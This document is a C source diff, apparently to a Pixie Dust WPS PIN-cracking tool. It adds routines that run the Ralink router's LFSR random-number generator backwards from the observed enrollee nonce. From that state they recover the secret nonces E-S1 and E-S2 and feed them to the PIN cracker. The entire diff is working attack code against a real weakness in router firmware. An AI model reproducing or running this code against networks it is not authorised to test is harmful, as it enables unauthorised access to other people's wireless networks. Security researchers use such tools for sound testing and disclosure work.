@@ -145,7 +145,7 @@ static unsigned char ralink_randbyte(struct ralink_randstate *state)
 	unsigned char r = 0;
 	for (int i = 0; i < 8; i++) {
 #if defined(__mips__) || defined(__mips)
-		uint32_t lsb_mask = -(state->sreg & 1);
+		const uint32_t lsb_mask = -(state->sreg & 1);
 		state->sreg ^= lsb_mask & 0x80000057;
 		state->sreg >>= 1;
 		state->sreg |= lsb_mask & 0x80000000;
@@ -164,6 +164,51 @@ static unsigned char ralink_randbyte(struct ralink_randstate *state)
 #endif
 	}
 	return r;
+}
+
+static void ralink_randbyte_back(struct ralink_randstate *state, uint8_t r)
+{
+	for (int i = 0; i < 8; i++) {
+		const unsigned char result = r & 1;
+		r = r >> 1;
+		if (result) {
+			state->sreg = (((state->sreg) << 1) ^ 0x80000057) | 0x00000001;
+		}
+		else {
+			state->sreg = state->sreg << 1;
+		}
+	}
+}
+
+static unsigned char ralink_randbyte_backwards(struct ralink_randstate *state)
+{
+	unsigned char r = 0;
+	for (int i = 0; i < 8; i++) {
+		unsigned char result;
+		if (state->sreg & 0x80000000) {
+			state->sreg = ((state->sreg << 1) ^ 0x80000057) | 0x00000001;
+			result = 1;
+		}
+		else {
+			state->sreg = state->sreg <<  1;
+			result = 0;
+		}
+		r |= result << i;
+	}
+	return r;
+}
+
+static void ralink_randbyte_backbytes(struct ralink_randstate *state, const int num_bytes)
+{
+	uint32_t lfsr = bit_revert(state->sreg);
+	int k = 8 * num_bytes;
+	while (k--) {
+		unsigned int lsb_mask = -(lfsr & 1);
+		lfsr ^= lsb_mask & 0xd4000003;
+		lfsr >>= 1;
+		lfsr |= lsb_mask & 0x80000000;
+	}
+	state->sreg = bit_revert(lfsr);
 }
 
 static int crack_rt(uint32_t start, uint32_t end, uint32_t *result)
@@ -1062,7 +1107,7 @@ usage_err:
 	/* Attempt special cases first in auto mode */
 	if (wps->mode_auto) {
 
-		/* E-S1 = E-S2 = 0 */
+		/* E-S1 = E-S2 = 0, test anyway */
 		if (memcmp(wps->pke, wps_rtl_pke, WPS_PKEY_LEN)) {
 			memset(wps->e_s1, 0, WPS_SECRET_NONCE_LEN);
 			memset(wps->e_s2, 0, WPS_SECRET_NONCE_LEN);
@@ -1104,25 +1149,24 @@ usage_err:
 			}
 
 			if (found_p_mode == NONE) {
-				init_crack_jobs(wps, RT);
-				wps->nonce_seed = collect_crack_jobs();
-				if (wps->nonce_seed != 0) {
-					unsigned lfsr = bit_revert(wps->nonce_seed);
-					int k = 8 * 32;
-					while (k--) {
-						unsigned int lsb_mask = -(lfsr & 1);
-						lfsr ^= lsb_mask & 0xd4000003;
-						lfsr >>= 1;
-						lfsr |= lsb_mask & 0x80000000;
-					}
-					struct ralink_randstate prng;
-					prng.sreg = bit_revert(lfsr);
-					wps->s1_seed = prng.sreg;
-					for (int i = 0; i < WPS_NONCE_LEN; i++)
-						wps->e_s1[i] = ralink_randbyte(&prng);
+				struct ralink_randstate prng = {0};
+				for (int i = WPS_NONCE_LEN; i--; )
+					ralink_randbyte_back(&prng, wps->e_nonce[i]);
+				const uint32_t saved_sreg = prng.sreg;
+
+				int j;
+				for (j = 0; j < WPS_NONCE_LEN; j++)
+					if (ralink_randbyte(&prng) != wps->e_nonce[j]) break;
+
+				if (j == WPS_NONCE_LEN) {
+					prng.sreg = saved_sreg;
+					wps->nonce_seed = prng.sreg;
+					for (int i = WPS_SECRET_NONCE_LEN; i--; )
+						wps->e_s2[i] = ralink_randbyte_backwards(&prng);
 					wps->s2_seed = prng.sreg;
-					for (int i = 0; i < WPS_NONCE_LEN; i++)
-						wps->e_s2[i] = ralink_randbyte(&prng);
+					for (int i = WPS_SECRET_NONCE_LEN; i--; )
+						wps->e_s1[i] = ralink_randbyte_backwards(&prng);
+					wps->s1_seed = prng.sreg;
 
 					DEBUG_PRINT_ATTEMPT(wps->e_s1, wps->e_s2);
 					if (crack(wps, wps->pin) == PIN_FOUND) {
